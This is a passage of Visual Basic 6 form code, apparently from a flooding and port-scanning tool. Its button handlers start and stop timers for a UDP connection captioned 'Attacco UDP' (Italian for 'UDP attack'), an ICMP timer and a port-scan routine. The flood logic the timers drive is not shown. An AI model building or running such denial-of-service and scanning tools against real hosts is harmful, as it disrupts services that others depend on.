WinsockResolve.Connect Text1.Text, Text2.Text
End Sub

Private Sub xpButton4_Click()
On Error Resume Next
Timer2.Enabled = True
WinsockUDP.Connect Text1.Text, Text4.Text
Timer4.Enabled = True
Label19.Caption = "Attacco UDP"
End Sub

Private Sub xpButton5_Click()
Timer2.Enabled = False
WinsockUDP.Close
End Sub

Private Sub xpButton6_Click()
TimerICMP.Enabled = True
End Sub

Private Sub xpButton7_Click()
TimerICMP.Enabled = False
End Sub

Private Sub xpButton8_Click()
Text6.Text = 0
Text7.Text = 500
List1.Clear
PB1.Value = 0
End Sub

Private Sub xpButton9_Click()
TimerPort.Enabled = True
PB1.Max = Text7.Text
xpButton9.Enabled = False
Text6.Enabled = False
End Sub
